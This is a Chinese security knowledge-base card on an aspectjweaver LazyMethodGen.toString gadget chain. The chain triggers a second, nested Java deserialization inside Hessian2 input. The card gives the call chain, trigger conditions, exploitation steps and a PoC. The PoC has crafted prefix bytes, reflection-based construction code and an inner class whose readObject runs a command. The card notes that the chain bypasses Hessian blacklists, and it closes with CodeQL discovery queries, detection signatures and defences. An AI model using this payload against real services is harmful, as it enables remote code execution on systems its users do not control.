---
id: web-java-deser-hessian-aspectj-lazymethodgen-second-order
title: aspectjweaver LazyMethodGen.toString 链：经 AjAttribute 读取走到 ObjectInputStream 二次反序列化
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: aspectj-lazymethodgen-tostring-second-order-deserialization
aliases:
- Hessian aspectjweaver 二次反序列化
- LazyMethodGen toString 链
- AspectJ 二次反序列化新链
- readAjAttributes 二次反序列化
- ResolvedTypeMunger.readSourceLocation
tags:
- java
- hessian
- aspectj
- aspectjweaver
- deserialization
- gadget
- second-order
- tostring
- objectinputstream
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:38:30+08:00'
  notes: 已对照原文与35张截图核对：CodeQL ToStringReach 命中 LazyMethodGen→ObjectInputStream.readObject（img/11/14）、深度9（img/13）、LazyMethodGen.toString→toLongString→print→printAspectAttributes（img/18-20）、printAspectAttributes 将 attributes 传 Utility.readAjAttributes（img/21）、Utility.readAjAttributes 两遍遍历 Unknown 并调 AjAttribute.read（img/22/25/26）、AjAttribute.read 的 TypeMunger.AttributeName 分支调 ResolvedTypeMunger.read（img/23）、Kind/MemberKind 字节分派（img/24/27/30）、readSourceLocation 中 if(s.getMajorVersion()<2)return null; 后 new ObjectInputStream(s).readObject()（img/33/34）、原文调试栈 test1.readObject→…→LazyMethodGen.toString（img/35）均一致。卡片正确指出原文“需要 s.getMajorVersion()<2”与源码/截图相反（实际 >=2）、原文末尾 main 变量混用（构造 poc 却反序列化 bytes）与 Hessian2Serialize_3 已自带 C 前缀不应重复前置。小瑕疵：PoC 注释版前缀字节比原文实际 61 字节少 compressed=false 与 1 个尾部 0（原文数组为 61 字节），建议按原文数组为准。aspectjweaver 1.9.7 为验证环境依赖版本，非受影响区间，未设 versions。未在本机复现。
---

## 一句话结论

`aspectjweaver` 的 `LazyMethodGen.toString()` 会一路走到 `Utility.readAjAttributes → AjAttribute.read → ResolvedTypeMunger.readSourceLocation`，后者直接 `new ObjectInputStream(s).readObject()`；只要把恶意序列化字节塞进 `LazyMethodGen.attributes` 里的 `Unknown.getBytes()`，再用 Hessian2 的 `toString` 触发方式调用 `toString()`，就能在 Hessian 外层流不被拦截的情况下完成二次 Java 反序列化并执行任意 gadget。

## 原理

调用链（原文 CodeQL 查询 + 动态调试确认）：

```text
LazyMethodGen.toString
  → LazyMethodGen.toLongString
    → LazyMethodGen.print
      → LazyMethodGen.printAspectAttributes
        → Utility.readAjAttributes
          → AjAttribute.read
            → ResolvedTypeMunger.read
              → NewFieldTypeMunger.readField / NewMethodTypeMunger.readMethod
                / NewConstructorTypeMunger.readConstructor / NewMemberClassTypeMunger.readInnerClass
                → ResolvedTypeMunger.readSourceLocation
                  → ObjectInputStream.readObject()
```

- `LazyMethodGen.toString()` 取 `enclosingClass.getBcelObjectType().getWeaverVersionAttribute()` 后调用 `toLongString`；`toLongString` 创建 `PrintStream` 调 `print`；`print` 调 `printAspectAttributes`。
- `printAspectAttributes` 把字段 `attributes` 转成数组交给 `Utility.readAjAttributes(getClassName(), attributes.toArray(...), context, null, weaverVersion, ...)`。`attributes` 是 `List<Attribute>`，可以通过反射替换成攻击者构造的 `Unknown`。
- `Utility.readAjAttributes` 第一遍倒序遍历 `Attribute[]`，只对 `instanceof Unknown` 的项处理，并用 `name` 匹配 `WeaverVersionInfo.AttributeName` 来设置版本；第二遍对每个 `Unknown` 调 `AjAttribute.read(version, name, a.getBytes(), ...)`。`Unknown.getBytes()` 原样返回构造时传入的 `bytes`，即完全可控的字节流。
- `AjAttribute.read` 根据 `name` 分派；当 `name` 等于 `TypeMunger.AttributeName`（`org.aspectj.weaver.TypeMunger`）时调用 `ResolvedTypeMunger.read(s, context)`。
- `ResolvedTypeMunger.read` 读一个 Kind 字节（1=Field、2=Method、5=Constructor、12=InnerClass 等）并分派到对应 `readXxx`；这些方法先读取 member 描述，最后调用 `readSourceLocation(s)`。
- `readSourceLocation` 在 `s.getMajorVersion() >= WEAVER_VERSION_MAJOR_AJ150`（值为 2）时继续，构造 `ObjectInputStream ois = new ObjectInputStream(s)`，随后 `ois.readObject()`，完成对 `Unknown.bytes` 中剩余内容的原生反序列化。

关键点：Hessian 的外层类白名单/黑名单只作用于外层流；`LazyMethodGen` 本身不是恶意 gadget，真正执行命令的类藏在 `Unknown.bytes` 里由 `ObjectInputStream` 单独反序列化，因此这条链常被用来绕过 Hessian 黑名单。

## 触发条件

- 目标 classpath 存在 `aspectjweaver`（原文验证 1.9.7），且 Hessian2 反序列化入口可达。
- 攻击者能控制反序列化对象图，构造 `LazyMethodGen` 并替换其 `attributes` 字段（原文通过反射完成；实际利用需要在构造端完成对象图后序列化）。
- Weaver 版本 `major_version >= 2`，否则 `readSourceLocation` 直接 `return null`，到不了 sink。原文 PoC 通过反射把 `BcelObjectType.getWeaverVersionAttribute()` 的 `major_version` 强制设为 2。
- `readResolvedMember` 中 `compressed` 必须为 false，`readSourceLocation` 里 `s.readByte()` 必须读到 0，才会进入 `new ObjectInputStream(s)` 分支。
- `declaringType` 的签名不能是 `@missing@`，用常见签名（如 `Ljava/lang/Object;`）。
- 内层 payload 是一个实现 `Serializable` 的类，其 `readObject` 或 gadget 链可执行命令。

## 利用步骤

1. 用 `BcelWorld` 解析 `java.lang.Object` 得到 `BcelObjectType`，反射修改其 `WeaverVersionInfo.major_version` 为 2。
2. 构造 `LazyClassGen(bot)` 和 `LazyMethodGen(method, lazyClassGen)`，调用 `getAnnotations()` 初始化。
3. 反射拿到 `LazyMethodGen.attributes` 字段，放入一个 `Unknown`：
   - `name` 设为 `org.aspectj.weaver.TypeMunger`；
   - `bytes` = 手写的 `ResolvedTypeMunger` 前缀 + `ObjectOutputStream` 序列化的恶意对象。
4. 用前文的 `Hessian2Serialize_3`（前置 `C` + `setAllowNonSerializable(true)`）序列化 `LazyMethodGen`。
5. 将字节发给 Hessian2 入口；外层解析错误调用 `LazyMethodGen.toString()`，按上面的链路进入 `ObjectInputStream.readObject()`，内层恶意对象被反序列化执行。

## PoC

前缀字节（原文，含义注释）：

```text
new byte[]{
  1,                                // ResolvedTypeMunger.Kind = Field
  1,                                // MemberKind = METHOD
  0, 18, 'L','j','a','v','a','/','l','a','n','g','/','O','b','j','e','c','t',';', // declaringType
  0, 0, 0, 1,                       // modifiers = public
  0, 10, 't','e','s','t','M','e','t','h','o','d',        // name
  0, 3, '(', ')', 'V',              // signature ()V
  0, 0,                             // checkedExceptions 长度 0
  0, 0, 0, 0,                       // start
  0, 0, 0, 0,                       // end
  0, 0, 0, 0, 0, 0                  // compressed=false 后的 b=0 等
}
```

内层恶意类：

```java
public class test1 implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec("open -a Calculator");
    }
}
```

核心构造：

```java
ClassLoaderRepository repo = new ClassLoaderRepository(test.class.getClassLoader());
JavaClass javaClass = repo.loadClass("java.lang.Object");
BcelWorld world = new BcelWorld("java.class.path");
ReferenceType type = (ReferenceType) world.resolve(UnresolvedType.forName("java.lang.Object"));
BcelObjectType bot = (BcelObjectType) type.getDelegate();

// 反射把 weaver major_version 强制为 2
Method getWv = bot.getClass().getDeclaredMethod("getWeaverVersionAttribute");
getWv.setAccessible(true);
Object wvInfo = getWv.invoke(bot);
Field major = wvInfo.getClass().getDeclaredField("major_version");
major.setAccessible(true);
major.setShort(wvInfo, (short) 2);

LazyClassGen lazyClassGen = new LazyClassGen(bot);
LazyMethodGen lazyMethodGen = new LazyMethodGen(javaClass.getMethods()[0], lazyClassGen);
lazyMethodGen.getAnnotations();

ByteArrayOutputStream inner = new ByteArrayOutputStream();
new ObjectOutputStream(inner).writeObject(new test1());
byte[] memberBytes = {/* 上面的前缀 */};
byte[] bytes = concat(memberBytes, inner.toByteArray());

Unknown unknown = new Unknown(cp.getLength(), bytes.length, bytes, newCp);
Field attrs = LazyMethodGen.class.getDeclaredField("attributes");
attrs.setAccessible(true);
attrs.set(lazyMethodGen, List.of(unknown));

byte[] payload = Hessian2Serialize_3(lazyMethodGen); // 前置 C
Hession2Deserialize(payload);
```

原文调试栈（图 35）确认到达：`test1.readObject → ObjectInputStream.readObject → ResolvedTypeMunger.readSourceLocation → NewFieldTypeMunger.readField → ResolvedTypeMunger.read → AjAttribute.read → Utility.readAjAttributes → LazyMethodGen.printAspectAttributes → ... → LazyMethodGen.toString`。

注意：原文最后一段 `main` 存在变量混用（构造了 `poc` 却调用 `Hession2Deserialize(bytes)`），按前文与调试截图，实际应反序列化 `Hessian2Serialize_3(lazyMethodGen)` 产生的字节；`Hessian2Serialize_3` 已负责前置 `C`，不要再重复前置。另外原文行文有一处写成“需要 `s.getMajorVersion()<2`”，与源码/截图中的 `if (s.getMajorVersion() < 2) return null;` 相反，实际需要 `>=2`。

## 挖掘方法（CodeQL）

- 把 aspectjweaver 源码 jar 解压后构建 CodeQL Java 数据库（`mvn dependency:sources` + `jar -xf ...-sources.jar`，`codeql database create --language=java --command="mvn clean compile -q -fn"`）。
- 用“方法可达性”查询从 `toString()` 出发找 `readObject`/`invoke`/`exec`/`newInstance`/`forName`/`getMethod`：
  ```ql
  predicate directCall(Method caller, Method callee) {
    exists(MethodCall ma | ma.getEnclosingCallable() = caller and ma.getMethod() = callee)
  }
  from Method src, Method sink
  where src.hasName("toString") and src.getNumberOfParameters() = 0 and src.fromSource()
    and sink = directCall+(src)
    and sink.getDeclaringType().hasQualifiedName("java.io", "ObjectInputStream")
    and sink.hasName("readObject")
  select src.getDeclaringType().getQualifiedName(), sink.getName()
  ```
- 再用固定深度的 `reachableIn` 查询确认路径长度（原文得到 9 层），最后逐层展开 `m0..m9` 输出完整链。
- 同样的方法查 `hashCode` 出发的链在 aspectjweaver 中没有命中，说明 source 选择本身会决定能否发现链。

## 变体与关联

- 内层 sink 不限于 `Runtime.exec`：任何原生反序列化 gadget（CommonsCollections、TemplatesImpl 等）都可放进 `Unknown.bytes`，由 `ObjectInputStream` 直接处理，从而绕过 Hessian 层黑名单。
- 外层触发可换成其他能调用 `toString()` 的入口（本卡依赖 Hessian2 协议错误触发，见 [[web-java-deser-hessian2-protocol-error-tostring-trigger]]）。
- 同类“toString 进入二次反序列化”思路可参考 SignedObject 二次反序列化（[[web-java-deser-hessian-signedobject-second-order-templates]]），区别是本链不依赖 `SignedObject`，而依赖 aspectjweaver 的 `readAjAttributes`。
- 关联：[[web-java-deser-hessian-deserialization-entry-map-put]]（Hessian 的另一类入口）。

## 检测与防御

- 检测：Hessian 流中出现 `org.aspectj.weaver.bcel.LazyMethodGen`、`org.aspectj.weaver.Unknown`、`org.aspectj.weaver.TypeMunger` 等类名；`LazyMethodGen.toString` 在异常路径被调用。
- 检测：JVM 中出现 `ObjectInputStream` 被嵌套调用的栈（反序列化内部再反序列化），尤其 `readSourceLocation` 附近；监控 `Runtime.exec` 与二次反序列化特征。
- 防御：Hessian 入口启用严格的类允许列表，禁止 `LazyMethodGen` 等非业务类；不要只依赖黑名单（本链正是黑名单绕过形态）。
- 防御：升级 aspectjweaver 到修复版本；若业务不需要 AOP 织入，移除该依赖或限制其类加载。
- 防御：对反序列化流做嵌套检测与深度限制，禁止在反序列化过程中再次创建 `ObjectInputStream`。
